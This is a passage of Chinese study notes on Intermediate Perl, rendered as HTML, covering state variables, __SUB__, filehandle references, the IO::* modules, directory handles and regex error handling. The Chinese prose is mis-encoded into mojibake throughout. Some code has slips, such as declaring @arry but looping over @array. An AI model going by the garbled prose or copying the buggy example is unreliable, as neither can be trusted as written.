(ä¹Ÿå°±æ˜¯è¯´é‡å¤è°ƒç”¨å­ä¾‹ç¨‹æ—¶å€¼ä¸ä¼šä¸¢å¤±)</p><p>å¯ä»¥ä½¿ç”¨ <code>state</code> è¯­å¥åœ¨å­ä¾‹ç¨‹å†…éƒ¨å£°æ˜å˜é‡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">countdown</span> </span>&#123;<br>    <span class="hljs-keyword">state</span> $countdown = <span class="hljs-number">10</span>;<br>    $countdown--;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>state</code> å˜é‡æœ‰ä¸€ä¸ªé™åˆ¶, ä»…èƒ½ä½¿ç”¨ state è¯­å¥åˆå§‹åŒ–æ ‡é‡å˜é‡. èƒ½å¤Ÿä½¿ç”¨ state è¯­å¥å£°æ˜ä»»ä½•ç±»å‹çš„å˜é‡, ä½†æ˜¯ä¸èƒ½åˆå§‹åŒ–å®ƒä»¬.</p><h2 id="7-8-æŸ¥è¯¢æˆ‘ä»¬è‡ªå·±çš„èº«ä»½"><a href="#7-8-æŸ¥è¯¢æˆ‘ä»¬è‡ªå·±çš„èº«ä»½" class="headerlink" title="7.8 æŸ¥è¯¢æˆ‘ä»¬è‡ªå·±çš„èº«ä»½"></a>7.8 æŸ¥è¯¢æˆ‘ä»¬è‡ªå·±çš„èº«ä»½</h2><p>Perl v5.16 ç‰ˆå¼•å…¥ <code>__SUB__</code> æ ‡è®° (token), è¿”å›ä¸€ä¸ªæŒ‡å‘å½“å‰å­ä¾‹ç¨‹çš„å¼•ç”¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $sub = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>    <span class="hljs-keyword">state</span> $n = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> $n &gt; -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">say</span> $n--;<br>    __SUB_<span class="hljs-number">_</span>-&gt;();<br>&#125;<br>$sub-&gt;();<br></code></pre></td></tr></table></figure><h3 id="7-8-1-ä»¤äººç€è¿·çš„å­ä¾‹ç¨‹"><a href="#7-8-1-ä»¤äººç€è¿·çš„å­ä¾‹ç¨‹" class="headerlink" title="7.8.1 ä»¤äººç€è¿·çš„å­ä¾‹ç¨‹"></a>7.8.1 ä»¤äººç€è¿·çš„å­ä¾‹ç¨‹</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @arry = ( \ <span class="hljs-string">&#x27;xyz&#x27;</span>, [<span class="hljs-string">qw(a b c)</span>], <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Buster&#x27;</span> &#125; );<br><br><span class="hljs-keyword">foreach</span> ( @array ) &#123;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> \ <span class="hljs-string">&#x27;&#x27;</span>   ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Scalar $$_&quot;</span> &#125;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> []     ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Array @$_&quot;</span> &#125;<br>    <span class="hljs-keyword">when</span> (<span class="hljs-keyword">ref</span> eq <span class="hljs-keyword">ref</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;&#125; ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Sub ???&quot;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¯ä¸€ä¸ª <code>when</code> ä¸­çš„ç¬¬ä¸€ä¸ª <code>ref</code> å®é™…ä¸Šæ˜¯ <code>ref $_</code>.</p><h3 id="7-8-2-è½¬å‚¨é—­åŒ…"><a href="#7-8-2-è½¬å‚¨é—­åŒ…" class="headerlink" title="7.8.2 è½¬å‚¨é—­åŒ…"></a>7.8.2 è½¬å‚¨é—­åŒ…</h3><p>Data::Dump::Streamer æ¨¡å—æ˜¯å¢å¼ºç‰ˆçš„ Data::Dumper æ¨¡å—.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dump::Streamer;<br><br><span class="hljs-keyword">my</span> @luxuries = <span class="hljs-string">qw(Diamonds Furs Caviar)</span>;<br><br><span class="hljs-keyword">my</span> $hash = &#123;<br>    <span class="hljs-string">Gilligan           =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Howdy Skipper!&#x27;</span>     &#125;,<br>    <span class="hljs-string">Skipper            =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Gilligan!!!!&#x27;</span>       &#125;,<br>    <span class="hljs-string">&#x27;Mr. Howell&#x27;</span>       =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Money money money!&#x27;</span> &#125;,<br>    <span class="hljs-string">Ginger             =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">say</span> $luxuries[<span class="hljs-keyword">rand</span> @luxuries] &#125;,<br>&#125;;<br><br>Dump $hash;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬8ç« -æ–‡ä»¶å¥æŸ„å¼•ç”¨"><a href="#ç¬¬8ç« -æ–‡ä»¶å¥æŸ„å¼•ç”¨" class="headerlink" title="ç¬¬8ç«  æ–‡ä»¶å¥æŸ„å¼•ç”¨"></a>ç¬¬8ç«  æ–‡ä»¶å¥æŸ„å¼•ç”¨</h1><h2 id="8-1-æ—§æ–¹æ³•"><a href="#8-1-æ—§æ–¹æ³•" class="headerlink" title="8.1 æ—§æ–¹æ³•"></a>8.1 æ—§æ–¹æ³•</h2><h2 id="8-2-æ”¹è¿›çš„æ–¹æ³•"><a href="#8-2-æ”¹è¿›çš„æ–¹æ³•" class="headerlink" title="8.2 æ”¹è¿›çš„æ–¹æ³•"></a>8.2 æ”¹è¿›çš„æ–¹æ³•</h2><p>ä» Perl v5.6 å¼€å§‹, <code>open</code> å‘½ä»¤èƒ½å¤Ÿä»¥æ™®é€šçš„æ ‡é‡å˜é‡å½¢å¼åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„å¼•ç”¨, å‰ææ˜¯åªè¦è¯¥æ ‡é‡å˜é‡çš„å€¼æœªå®šä¹‰.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $log_fh;<br><span class="hljs-keyword">open</span> $log_fh, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;castaways.log&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open castways.log: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>åŒæ ·, åœ¨ <code>&lt;&gt;</code> ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> ( &lt;$log_fh&gt; ) &#123; ... &#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-æŒ‡å‘å­—ç¬¦ä¸²çš„æ–‡ä»¶å¥æŸ„"><a href="#8-3-æŒ‡å‘å­—ç¬¦ä¸²çš„æ–‡ä»¶å¥æŸ„" class="headerlink" title="8.3 æŒ‡å‘å­—ç¬¦ä¸²çš„æ–‡ä»¶å¥æŸ„"></a>8.3 æŒ‡å‘å­—ç¬¦ä¸²çš„æ–‡ä»¶å¥æŸ„</h2><p>ä» Perl v5.6 å¼€å§‹, èƒ½å¤Ÿæ‰“å¼€ä¸€ä¸ªæ ‡é‡å¼•ç”¨å½¢å¼çš„æ–‡ä»¶å¥æŸ„, è€Œä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶, è¯¥æ–‡ä»¶å¥æŸ„è¦ä¹ˆä»è¯¥å­—ç¬¦ä¸²è¯»å–è¦ä¹ˆå‘è¯¥å­—ç¬¦ä¸²å†™å…¥.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $string_fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, \ <span class="hljs-keyword">my</span> $string;<br></code></pre></td></tr></table></figure><h3 id="é€è¡Œå¤„ç†å­—ç¬¦ä¸²"><a href="#é€è¡Œå¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="é€è¡Œå¤„ç†å­—ç¬¦ä¸²"></a>é€è¡Œå¤„ç†å­—ç¬¦ä¸²</h3><h2 id="8-4-æ–‡ä»¶å¥æŸ„é›†åˆ"><a href="#8-4-æ–‡ä»¶å¥æŸ„é›†åˆ" class="headerlink" title="8.4 æ–‡ä»¶å¥æŸ„é›†åˆ"></a>8.4 æ–‡ä»¶å¥æŸ„é›†åˆ</h2><p>å¯ä»¥å°†æ–‡ä»¶å¥æŸ„å¼•ç”¨ä½œä¸ºæ•°ç»„å…ƒç´ æˆ–è€…æ•£åˆ—å€¼å­˜å‚¨.</p><p>å½“æ–‡ä»¶å¥æŸ„è¶…å‡ºå…¶ä½œç”¨åŸŸæ—¶, å°±ä¼šè¢«è‡ªåŠ¨å…³é—­.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">state</span> $fhs;<br><br>    <span class="hljs-keyword">my</span>($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br><br>    <span class="hljs-keyword">unless</span> ( $fhs-&gt;&#123;$source&#125; ) &#123;<br>        <span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, $source <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;...&#x27;</span>;<br>        $fhs-&gt;&#123;$source&#125; = $fh;<br>    &#125;<br><br>    <span class="hljs-keyword">say</span> &#123; $fhs-&gt;&#123;$source&#125; &#125; <span class="hljs-string">&quot;$destination $bytes&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-5-IO-Handle-æ¨¡å—å’Œå…¶ä»–ç›¸åº”çš„æ¨¡å—"><a href="#8-5-IO-Handle-æ¨¡å—å’Œå…¶ä»–ç›¸åº”çš„æ¨¡å—" class="headerlink" title="8.5 IO::Handle æ¨¡å—å’Œå…¶ä»–ç›¸åº”çš„æ¨¡å—"></a>8.5 IO::Handle æ¨¡å—å’Œå…¶ä»–ç›¸åº”çš„æ¨¡å—</h2><p>åœ¨å¹•å, Perl å®é™…ä¸Šä½¿ç”¨ IO::Handle æ¨¡å—å®ç°æ–‡ä»¶å¥æŸ„æ“ä½œ.</p><p>æ–‡ä»¶å¥æŸ„é‡å®é™…ä¸Šæ˜¯ IO::Handle æ¨¡å—çš„å¯¹è±¡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Handle;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, $filename <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;...&#x27;</span>;<br>$fh-&gt;<span class="hljs-keyword">print</span>( <span class="hljs-string">&#x27;Coconut headphones&#x27;</span> );<br>$fh-&gt;<span class="hljs-keyword">close</span>;<br></code></pre></td></tr></table></figure><p>è‡ª Perl v5.14 ä¹‹å, ä¸å¿…æ˜¾å¼åŠ è½½ IO::Handle æ¨¡å—.</p><p>IO::Handle åŒ…å¯¹äºè¾“å…¥, è¾“å‡ºæ“ä½œè€Œè¨€æ˜¯åŸºç¡€ç±», å› æ­¤å®ƒèƒ½å¤Ÿå¤„ç†å¾ˆå¤šäº‹æƒ…, è€Œä¸ä»…ä»…æ˜¯æ–‡ä»¶.</p><h3 id="8-5-1-IO-File-æ¨¡å—"><a href="#8-5-1-IO-File-æ¨¡å—" class="headerlink" title="8.5.1 IO::File æ¨¡å—"></a>8.5.1 IO::File æ¨¡å—</h3><p>IO::File æ¨¡å—æ˜¯ IO::Handle æ¨¡å—ç”¨äºæ“ä½œæ–‡ä»¶çš„å­é›†, è¯¥æ¨¡å—æ¥è‡ªäº Perl æ ‡å‡†å‘è¡Œç‰ˆ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $read_fh = IO::File-&gt;new( <span class="hljs-string">&#x27;castaways.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span> );<br><span class="hljs-keyword">my</span> $write_fh = IO::File-&gt;new( <span class="hljs-string">&#x27;castaways.log&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span> );<br></code></pre></td></tr></table></figure><p>å…¶è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„.</p><p>æ‰“å¼€åŒ¿åçš„ä¸´æ—¶æ–‡ä»¶:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $temp_fh = IO::File-&gt;new_tmpfile;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ˜¾å¼è°ƒç”¨ <code>close</code> æˆ– <code>undef</code> å‘½ä»¤æ“ä½œæ–‡ä»¶å¥æŸ„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$temp_fh-&gt;<span class="hljs-keyword">close</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not close file: $!&quot;</span>;<br><br><span class="hljs-keyword">undef</span> $append_fh;<br></code></pre></td></tr></table></figure><p>å¦‚æœå°† <code>undef</code> ä½œä¸ºæ–‡ä»¶å, Perl v5.6 åŠåç»­ç‰ˆæœ¬èƒ½å¤Ÿæ‰“å¼€ä¸€ä¸ªåŒ¿å, ä¸´æ—¶çš„æ–‡ä»¶:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;+&gt;&#x27;</span>, <span class="hljs-keyword">undef</span><br>  <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open temp file: $!&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="8-5-2-IO-Scalar-æ¨¡å—"><a href="#8-5-2-IO-Scalar-æ¨¡å—" class="headerlink" title="8.5.2 IO::Scalar æ¨¡å—"></a>8.5.2 IO::Scalar æ¨¡å—</h3><p>è‹¥ Perl çš„ç‰ˆæœ¬ä¸èƒ½åˆ›å»ºæ ‡é‡å¼•ç”¨å½¢å¼çš„æ–‡ä»¶å¥æŸ„. å°±å¯ä»¥ä½¿ç”¨ IO::Scalar æ¨¡å—. è¯¥æ¨¡å—ä¸æ˜¯ Perl æ ‡å‡†å‘è¡Œç‰ˆçš„æ¨¡å—.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Scalar;<br><br><span class="hljs-keyword">my</span> $string_log = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">my</span> $scalar_fh = IO::Scalar-&gt;new( \$string_log );<br><br><span class="hljs-keyword">print</span> $scalar_fh <span class="hljs-string">&quot;The Howells&#x27;s private beach club is closed\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="8-5-3-IO-Tee-æ¨¡å—"><a href="#8-5-3-IO-Tee-æ¨¡å—" class="headerlink" title="8.5.3 IO::Tee æ¨¡å—"></a>8.5.3 IO::Tee æ¨¡å—</h3><p>å…¶ä¸æ˜¯è‡ªå¸¦çš„æ¨¡å—.</p><p>å°†å†…å®¹åŒæ—¶è¾“å‡ºåˆ°å¤šä¸ªåœ°æ–¹, ä½¿ç”¨ IO::Tea æ¨¡å—.</p><p>å½“è¾“å‡ºåˆ°è¾¾ IO::Tee æ¨¡å—æ—¶, å®ƒå°±èƒ½å¤ŸåŒæ—¶æµå‘ä¸¤ä¸ª (ç”šè‡³å¤šä¸ª) ä¸åŒçš„ç®¡é“.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Tee;<br><br><span class="hljs-keyword">my</span> $tee_fh = IO::Tee-&gt;new( $log_fh, $scalar_fh );<br><br><span class="hljs-keyword">print</span> $tee_fh <span class="hljs-string">&quot;The radio works in the middle of the ocean!\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœ IO::Tee æ¨¡å—çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ (éšåçš„å‚æ•°å¿…é¡»æ˜¯è¾“å‡ºæ–‡ä»¶å¥æŸ„).</p><p>å½“ IO::Tee æ¨¡å—ä»è¾“å…¥å¥æŸ„è¯»å–ä¸€è¡Œæ•°æ®æ—¶, ä»–å°±ç«‹å³å°†è¯¥æ•°æ®å†™å…¥è¾“å‡ºæ–‡ä»¶å¥æŸ„.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Tee;<br><br><span class="hljs-keyword">my</span> $tee_fh = IO::Tee-&gt;new( $read_fh, $log_fh, $scalar_fh );<br><br><span class="hljs-keyword">my</span> $message = &lt;$tee_fh&gt;;  <span class="hljs-comment"># è¿™ä¸€å¥å°±æ˜¯ä»è¾“å…¥å¥æŸ„è¯»å–ä¸€è¡Œåˆ° $message è¿™ä¸ªå˜é‡ä¸­</span><br></code></pre></td></tr></table></figure><p><code>$read_fh</code> å¯èƒ½è¿æ¥åˆ°ä¸€ä¸ªå¥—æ¥å­—, æ ‡é‡å˜é‡æˆ–è€…å¤–éƒ¨å‘½ä»¤çš„è¾“å‡º. </p><h3 id="8-5-4-IO-Pipe-æ¨¡å—"><a href="#8-5-4-IO-Pipe-æ¨¡å—" class="headerlink" title="8.5.4 IO::Pipe æ¨¡å—"></a>8.5.4 IO::Pipe æ¨¡å—</h3><p>ä¸ Shell ä¸­çš„ç®¡é“ç±»ä¼¼, ç¬¦å· <code>|</code> ä¹‹åçš„ <code>$command</code> å°†ä¼šè®°å½•æ¥è‡ªå‘½ä»¤çš„è¾“å‡º, ç„¶åé€šè¿‡ç®¡é“ä¼ å…¥ç¨‹åº. å…·ä½“è§ learning perl.</p><p>ä½¿ç”¨ IO::Pipe æ¨¡å—, å…¶è‡ªåŠ¨å¤„ç† fork å‘½ä»¤å’Œ exec å‘½ä»¤, è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„, å¯ä»¥ä»è¯¥æ–‡ä»¶å¥æŸ„è¯»å–å‘½ä»¤çš„è¾“å‡º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Pipe;<br><br><span class="hljs-keyword">my</span> $pipe = IO::Pipe-&gt;new;<br><br>$pipe-&gt;reader( <span class="hljs-string">&quot;$^X -V&quot;</span> );  <span class="hljs-comment"># $^X is the current perl executable</span><br><br><span class="hljs-keyword">while</span> ( &lt;$pipe&gt; ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Read: $_&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘½ä»¤å°±å†™åœ¨ <code>reader()</code> ä¸­.</p><p>å†™å…¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Pipe;<br><br><span class="hljs-keyword">my</span> $pipe = IO::Pipe-&gt;new;<br><br>$pipe-&gt;writer( $command );<br><br><span class="hljs-keyword">foreach</span> ( <span class="hljs-number">1</span> .. <span class="hljs-number">10</span> ) &#123;<br>    <span class="hljs-keyword">print</span> $pipe <span class="hljs-string">&quot;I can count to $_\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-5-5-IO-Null-æ¨¡å—å’Œ-IO-Interactive-æ¨¡å—"><a href="#8-5-5-IO-Null-æ¨¡å—å’Œ-IO-Interactive-æ¨¡å—" class="headerlink" title="8.5.5 IO::Null æ¨¡å—å’Œ IO::Interactive æ¨¡å—"></a>8.5.5 IO::Null æ¨¡å—å’Œ IO::Interactive æ¨¡å—</h3><p>ä½¿ç”¨ IO::Null æ¨¡å—åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ç”¨äºä¸¢å¼ƒæ‰€æä¾›çš„å†…å®¹, å¦‚ <code>/dev/null</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Null;<br><br><span class="hljs-keyword">my</span> $null_fn = IO::Null-&gt;new;<br><br>some_printing_thing( $null_fn, @args );<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Null;<br><br><span class="hljs-keyword">my</span> $debug_fn = $Debug ? *STDOUT : IO::Null-&gt;new;<br><br>$debug_fn-&gt;<span class="hljs-keyword">print</span>( <span class="hljs-string">&quot;Hey, the radio&#x27;s not working&quot;</span> );<br></code></pre></td></tr></table></figure><h2 id="8-6-ç›®å½•å¥æŸ„"><a href="#8-6-ç›®å½•å¥æŸ„" class="headerlink" title="8.6 ç›®å½•å¥æŸ„"></a>8.6 ç›®å½•å¥æŸ„</h2><p>ä¸åˆ›å»ºæ–‡ä»¶å¥æŸ„å¼•ç”¨çš„æ–¹å¼ä¸€è‡´:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $dh, <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open directory: $!&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file ( <span class="hljs-keyword">readdir</span>( $dh ) ) &#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Skipper, I found $file!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç›®å½•å¥æŸ„å¼•ç”¨"><a href="#ç›®å½•å¥æŸ„å¼•ç”¨" class="headerlink" title="ç›®å½•å¥æŸ„å¼•ç”¨"></a>ç›®å½•å¥æŸ„å¼•ç”¨</h3><p>è‡ª v5.6 èµ·, IO::Dir æ¨¡å—å°±æˆä¸º Perl æ ‡å‡†å‘è¡Œç‰ˆçš„ä¸€éƒ¨åˆ†.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Dir;<br><br><span class="hljs-keyword">my</span> $dir_fh = IO::Dir-&gt;new( <span class="hljs-string">&#x27;.&#x27;</span> )<br>    <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open dirhandle! $!&quot;</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬9ç« -æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨"><a href="#ç¬¬9ç« -æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨" class="headerlink" title="ç¬¬9ç«  æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨"></a>ç¬¬9ç«  æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨</h1><h2 id="9-1-æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨ä¹‹å‰"><a href="#9-1-æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨ä¹‹å‰" class="headerlink" title="9.1 æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨ä¹‹å‰"></a>9.1 æ­£åˆ™è¡¨è¾¾å¼å¼•ç”¨ä¹‹å‰</h2><p>ç”¨ eval è¯­å¥åœ¨åŒ¹é…æ—¶æ•è·å¯èƒ½å‘ç”Ÿçš„é”™è¯¯:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Enter a pattern: &#x27;</span>;<br><span class="hljs-keyword">chomp</span>( <span class="hljs-keyword">my</span> $pattern = &lt;STDIN&gt; );<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Enter some lines:\n&quot;</span>;<br><span class="hljs-keyword">while</span>(&lt;STDIN&gt;) &#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">eval</span> &#123; <span class="hljs-regexp">m/$pattern/</span> &#125; ) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Match: $_&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>($@) &#123;<br>        <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;There was a regex problem: $@\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å°è¯•ä½¿ç”¨ä¸€ä¸ªæ¨¡å¼ä¹‹å‰, ç¼–å†™ä¸€ä¸ªå­ä¾‹ç¨‹æµ‹è¯•è¯¥æ¨¡å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">is_valid_pattern</span> </span>&#123;<br>    <span class="hljs-keyword">my</span>( $pattern ) = @_;<br>    <span class="hljs-keyword">local</span>( $@ );<br><br>    <span class="hljs-keyword">eval</span> &#123; <span 